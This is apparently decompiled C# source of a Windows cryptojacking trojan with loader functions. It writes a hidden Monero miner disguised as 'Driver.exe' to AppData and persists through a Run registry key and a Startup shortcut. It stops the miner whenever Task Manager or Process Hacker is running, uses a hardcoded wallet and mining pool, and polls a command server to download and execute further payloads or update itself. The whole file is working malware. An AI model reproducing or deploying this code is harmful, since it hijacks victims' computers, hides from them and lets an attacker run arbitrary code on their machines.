using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using m.Properties;
using Microsoft.Win32;

namespace m
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002184 File Offset: 0x00000384
		public static void downloadAndExcecute(string url, string filename)
		{
			using (WebClient webClient = new WebClient())
			{
				FileInfo fileInfo = new FileInfo(filename);
				webClient.DownloadFile(url, fileInfo.FullName);
				Process.Start(fileInfo.FullName);
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000021D4 File Offset: 0x000003D4
		public static string get(string url)
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(url);
				webRequest.Credentials = CredentialCache.DefaultCredentials;
				((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
				result = new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002234 File Offset: 0x00000434
		public static string[] getTasks()
		{
			string[] array = Program.get(Program.adm + "?hwid=" + Program.HWID()).Split(new char[]
			{
				'|'
			});
			string[] array2 = new string[array.Length];
			int num = 0;
			foreach (string text in array)
			{
				try
				{
					string[] array4 = text.Split(new char[]
					{
						';'
					});
					string text2 = array4[0].Equals("Update") ? "upd" : "dwl";
					string text3 = array4[1];
					string text4 = array4[2];
					array2[num] = string.Concat(new string[]
					{
						text2,
						";",
						text3,
						";",
						text4
					});
				}
				catch (Exception)
				{
				}
				num++;
			}
			return array2;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002320 File Offset: 0x00000520
		public static int getTimeout()
		{
			return Convert.ToInt32(Program.get(Program.adm + "?timeout=1")) * 60 * 1000;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002354 File Offset: 0x00000554
		public static string HWID()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch (Exception)
			{
			}
			return result;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000023BC File Offset: 0x000005BC
		private static void Main(string[] args)
		{
			Environment.SystemDirectory.Split(new char[]
			{
				'\\'
			})[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
			Thread thread = new Thread(new ThreadStart(new Program.Loader().run));
			Thread thread2 = new Thread(new ThreadStart(new Program.Processer(Program.u, Program.pool).run));
			Thread thread3 = new Thread(new ThreadStart(new Program.Logger(Program.loggr).run));
			Thread thread4 = new Thread(new ThreadStart(new Program.Config().run));
			Thread thread5 = new Thread(new ThreadStart(Program.setConnection));
			thread4.Start();
			thread4.Join();
			thread3.Start();
			thread.Start();
			thread.Join();
			thread2.Start();
			thread5.Start();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000024A0 File Offset: 0x000006A0
		private static void restart(string filename)
		{
			string str = Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			})[Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			}).Length - 1];
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				Arguments = "/C ping 127.0.0.1 -n 2 && taskmgr && " + filename + " && del " + str,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			};
			Process.Start(startInfo);
			Environment.Exit(0);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002534 File Offset: 0x00000734
		public static void setConnection()
		{
			for (;;)
			{
				try
				{
					foreach (string text in Program.getTasks())
					{
						try
						{
							string text2 = text.Split(new char[]
							{
								';'
							})[0];
							string text3 = text.Split(new char[]
							{
								';'
							})[1];
							string text4 = text.Split(new char[]
							{
								';'
							})[2];
							string filename = text3.Split(new char[]
							{
								'/'
							})[text3.Split(new char[]
							{
								'/'
							}).Length - 1];
							if (text2.Equals("upd"))
							{
								Program.get(string.Concat(new string[]
								{
									Program.adm,
									"?hwid=",
									Program.HWID(),
									"&completed=",
									text4
								}));
								Program.update(text3, filename);
							}
							else
							{
								Program.downloadAndExcecute(text3, filename);
								Program.get(string.Concat(new string[]
								{
									Program.adm,
									"?hwid=",
									Program.HWID(),
									"&completed=",
									text4
								}));
							}
						}
						catch (Exception)
						{
						}
					}
					Thread.Sleep(Program.getTimeout());
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000026A8 File Offset: 0x000008A8
		public static void update(string url, string filename)
		{
			using (WebClient webClient = new WebClient())
			{
				FileInfo fileInfo = new FileInfo(filename);
				webClient.DownloadFile(url, fileInfo.FullName);
			}
			Program.restart(filename);
		}

		// Token: 0x04000001 RID: 1
		private static string adm = "";

		// Token: 0x04000002 RID: 2
		private static string loggr = "";

		// Token: 0x04000003 RID: 3
		private static string pool = "pool.supportxmr.com:3333";

		// Token: 0x04000004 RID: 4
		private static string u = "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQq8ANCL4mu9QqMXeRL";

		// Token: 0x02000003 RID: 3
		private class Config
		{
			// Token: 0x0600000C RID: 12 RVA: 0x000026F4 File Offset: 0x000008F4
			private void appShortcutToStartup(string linkName)
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				if (!File.Exists(folderPath + "\\" + linkName + ".url"))
				{
					using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + linkName + ".url"))
					{
						string str = this.path + this.currFilename;
						streamWriter.WriteLine("[InternetShortcut]");
						streamWriter.WriteLine("URL=file:///" + str);
						streamWriter.WriteLine("IconIndex=0");
						streamWriter.WriteLine("IconFile=" + Process.GetCurrentProcess().MainModule.FileName + "\\backup (3).ico");
						streamWriter.Flush();
					}
				}
			}

			// Token: 0x0600000D RID: 13 RVA: 0x000027C8 File Offset: 0x000009C8
			private void createDir()
			{
				try
				{
					if (!Directory.Exists(this.path))
					{
						Directory.CreateDirectory(this.path);
					}
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x0600000E RID: 14 RVA: 0x00002082 File Offset: 0x00000282
			private void createDll(string pth)
			{
			}

			// Token: 0x0600000F RID: 15 RVA: 0x00002808 File Offset: 0x00000A08
			public void move()
			{
				string currentDirectory = Environment.CurrentDirectory;
				string str = this.path;
				string searchPattern = this.currFilename;
				foreach (string text in Directory.GetFiles(currentDirectory, searchPattern))
				{
					string[] array = text.Split(new char[]
					{
						'\\'
					});
					string sourceFileName = text;
					string destFileName = str + array[array.Length - 1];
					try
					{
						File.Move(sourceFileName, destFileName);
					}
					catch (Exception)
					{
					}
				}
			}

			// Token: 0x06000010 RID: 16 RVA: 0x00002890 File Offset: 0x00000A90
			public byte[] readBytes(string file2)
			{
				string[] array = file2.Split(new char[]
				{
					' '
				});
				byte[] array2 = new byte[array.Length];
				for (int i = 0; i < array.Length; i++)
				{
					try
					{
						array2[i] = Convert.ToByte(array[i]);
					}
					catch (Exception)
					{
					}
				}
				return array2;
			}

			// Token: 0x06000011 RID: 17 RVA: 0x000028F0 File Offset: 0x00000AF0
			private void restart()
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					Arguments = "/C ping 127.0.0.1 -n 2 && \"" + this.path + this.currFilename + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
				Process.Start(startInfo);
				Environment.Exit(0);
			}

			// Token: 0x06000012 RID: 18 RVA: 0x0000294C File Offset: 0x00000B4C
			public void run()
			{
				this.path = Environment.SystemDirectory.Split(new char[]
				{
					'\\'
				})[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
				this.createDir();
				this.move();
				this.SetStartup();
			}

			// Token: 0x06000013 RID: 19 RVA: 0x0000299C File Offset: 0x00000B9C
			private void SetStartup()
			{
				try
				{
					this.appShortcutToStartup("Driver");
					string value = this.path + this.currFilename;
					Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Driver", value);
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x06000014 RID: 20 RVA: 0x000029F8 File Offset: 0x00000BF8
			public void WriteBytes(string fileName, byte[] byteArray, string pth)
			{
				using (FileStream fileStream = new FileStream(pth + fileName, FileMode.Create))
				{
					for (int i = 0; i < byteArray.Length; i++)
					{
						fileStream.WriteByte(byteArray[i]);
					}
					fileStream.Seek(0L, SeekOrigin.Begin);
					int num = 0;
					while ((long)num < fileStream.Length && (int)byteArray[num] == fileStream.ReadByte())
					{
						num++;
					}
				}
			}

			// Token: 0x04000005 RID: 5
			private string currFilename = Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			})[Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
			{
				'\\'
			}).Length - 1];

			// Token: 0x04000006 RID: 6
			private string path = "";
		}

		// Token: 0x02000004 RID: 4
		private class Loader
		{
			// Token: 0x06000016 RID: 22 RVA: 0x00002084 File Offset: 0x00000284
			private void checkInstall()
			{
				this.installed = File.Exists(this.path + "\\" + Program.Loader.minername);
			}

			// Token: 0x06000017 RID: 23 RVA: 0x00002AE8 File Offset: 0x00000CE8
			public static bool Is64Bit()
			{
				bool result;
				Program.Loader.IsWow64Process(Process.GetCurrentProcess().Handle, out result);
				return result;
			}

			// Token: 0x06000018 RID: 24
			[DllImport("kernel32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

			// Token: 0x06000019 RID: 25 RVA: 0x00002B08 File Offset: 0x00000D08
			private void load()
			{
				new WebClient();
				this.WriteBytes(Program.Loader.minername, Resources.AudioHD);
			}

			// Token: 0x0600001A RID: 26 RVA: 0x00002890 File Offset: 0x00000A90
			public byte[] readBytes(string file2)
			{
				string[] array = file2.Split(new char[]
				{
					' '
				});
				byte[] array2 = new byte[array.Length];
				for (int i = 0; i < array.Length; i++)
				{
					try
					{
						array2[i] = Convert.ToByte(array[i]);
					}
					catch (Exception)
					{
					}
				}
				return array2;
			}

			// Token: 0x0600001B RID: 27 RVA: 0x00002B2C File Offset: 0x00000D2C
			public void run()
			{
				this.path = Environment.SystemDirectory.Split(new char[]
				{
					'\\'
				})[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
				this.checkInstall();
				if (!this.installed)
				{
					try
					{
						this.load();
					}
					catch
					{
					}
					new Program.Config();
				}
			}

			// Token: 0x0600001C RID: 28 RVA: 0x00002BA0 File Offset: 0x00000DA0
			public void WriteBytes(string fileName, byte[] byteArray)
			{
				using (FileStream fileStream = new FileStream(this.path + fileName, FileMode.Create))
				{
					for (int i = 0; i < byteArray.Length; i++)
					{
						fileStream.WriteByte(byteArray[i]);
					}
					fileStream.Seek(0L, SeekOrigin.Begin);
					int num = 0;
					while ((long)num < fileStream.Length && (int)byteArray[num] == fileStream.ReadByte())
					{
						num++;
					}
				}
			}

			// Token: 0x04000007 RID: 7
			private static string bytesname = "cfg.txt";

			// Token: 0x04000008 RID: 8
			public string cryptV = "1";

			// Token: 0x04000009 RID: 9
			public bool installed;

			// Token: 0x0400000A RID: 10
			private bool is64bit = Program.Loader.Is64Bit();

			// Token: 0x0400000B RID: 11
			private static string loadUrl = Program.Loader.minername ?? "";

			// Token: 0x0400000C RID: 12
			private static string minername = "Driver.exe";

			// Token: 0x0400000D RID: 13
			private string path = "";

			// Token: 0x0400000E RID: 14
			public bool updated = true;
		}

		// Token: 0x02000005 RID: 5
		private class Logger
		{
			// Token: 0x0600001F RID: 31 RVA: 0x000020FF File Offset: 0x000002FF
			public Logger(string logger)
			{
				this.url = logger;
			}

			// Token: 0x06000020 RID: 32 RVA: 0x00002C2C File Offset: 0x00000E2C
			private void connect()
			{
				try
				{
					WebRequest webRequest = WebRequest.Create(this.url);
					webRequest.Credentials = CredentialCache.DefaultCredentials;
					((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
					new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x06000021 RID: 33 RVA: 0x00002119 File Offset: 0x00000319
			public void run()
			{
				this.connect();
			}

			// Token: 0x0400000F RID: 15
			private string url = "";
		}

		// Token: 0x02000006 RID: 6
		private class Processer
		{
			// Token: 0x06000022 RID: 34 RVA: 0x00002C8C File Offset: 0x00000E8C
			public Processer(string u, string pool)
			{
				this.pool = pool;
				this.username = u;
				Program.Processer.kernels = Environment.ProcessorCount / 2;
				Program.Processer.path = Environment.SystemDirectory.Split(new char[]
				{
					'\\'
				})[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
			}

			// Token: 0x06000023 RID: 35 RVA: 0x00002D00 File Offset: 0x00000F00
			private bool checkProcess(string name)
			{
				foreach (Process process in Process.GetProcesses())
				{
					if (process.ProcessName.Contains(name))
					{
						return true;
					}
				}
				return false;
			}

			// Token: 0x06000024 RID: 36 RVA: 0x00002D40 File Offset: 0x00000F40
			public void run()
			{
				string text = Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
				{
					'\\'
				})[Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
				{
					'\\'
				}).Length - 1];
				text = text.Replace(".exe", "");
				for (;;)
				{
					try
					{
						Process.GetProcessesByName(text)[1].Kill();
						goto IL_F0;
					}
					catch
					{
						goto IL_F0;
					}
					IL_6E:
					int i;
					string[] array;
					while (i < array.Length)
					{
						string name = array[i];
						if (this.checkProcess(name))
						{
							if (this.checkProcess(Program.Processer.processName))
							{
								try
								{
									this.stopProcess();
									goto IL_B4;
								}
								catch
								{
									goto IL_B4;
								}
								goto IL_A0;
							}
							IL_B4:
							if (!this.checkProcess(name))
							{
								goto IL_AC;
							}
							IL_A0:
							Thread.Sleep(1000);
							goto IL_B4;
						}
						IL_AC:
						i++;
					}
					if (!this.checkProcess(Program.Processer.processName))
					{
						try
						{
							this.runProcess(Program.Processer.processName);
						}
						catch
						{
						}
					}
					Thread.Sleep(1000);
					continue;
					IL_F0:
					array = Program.Processer.forbidden;
					i = 0;
					goto IL_6E;
				}
			}

			// Token: 0x06000025 RID: 37 RVA: 0x00002E74 File Offset: 0x00001074
			private void runProcess(string name)
			{
				new Process
				{
					StartInfo = 
					{
						FileName = Program.Processer.path + name + ".exe",
						WindowStyle = ProcessWindowStyle.Hidden,
						Arguments = string.Concat(new object[]
						{
							"-o ",
							this.pool,
							" -u ",
							this.username,
							" -p x -k -v=0 --donate-level=1 -t ",
							Program.Processer.kernels
						})
					}
				}.Start();
				this.isRunning = true;
			}

			// Token: 0x06000026 RID: 38 RVA: 0x00002121 File Offset: 0x00000321
			public void stopProcess()
			{
				Process.GetProcessesByName(Program.Processer.processName)[0].Kill();
				this.isRunning = false;
			}

			// Token: 0x04000010 RID: 16
			private static string[] forbidden = new string[]
			{
				"Taskmgr",
				"ProcessHacker",
				"taskmgr"
			};

			// Token: 0x04000011 RID: 17
			public bool isRunning;

			// Token: 0x04000012 RID: 18
			private static int kernels = 0;

			// Token: 0x04000013 RID: 19
			private static string path = "";

			// Token: 0x04000014 RID: 20
			private string pool = "";

			// Token: 0x04000015 RID: 21
			private static string processName = "Driver";

			// Token: 0x04000016 RID: 22
			private string username = "";
		}
	}
}
